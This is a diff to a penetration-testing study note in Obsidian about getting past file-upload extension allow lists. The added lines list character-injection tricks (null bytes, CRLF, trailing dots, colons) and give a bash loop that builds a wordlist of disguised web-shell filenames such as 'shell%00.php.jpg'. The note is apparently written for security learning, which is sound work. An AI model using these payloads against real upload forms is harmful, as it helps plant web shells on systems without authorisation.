@@ -16,4 +16,24 @@ debugInConsole: false # Print debug info in Obsidian console
 ### File Extension Allow List
 - Fuzzing extensions is still useful to see what extensions are available, it may also show if any extensions are able to be bypassed 
 - Use double stacked extensions, it may be that the filter only check if it contains, not ends with
-- 
+- Character injection (these have specific ways to be used however but most lists will include it correctly)
+	- `%20`
+	- `%0a`
+	- `%00`
+	- `%0d0a`
+	- `/`
+	- `.\`
+	- `.`
+	- `…`
+	- `:`
+This script will generate all permutations of character injection using the above
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
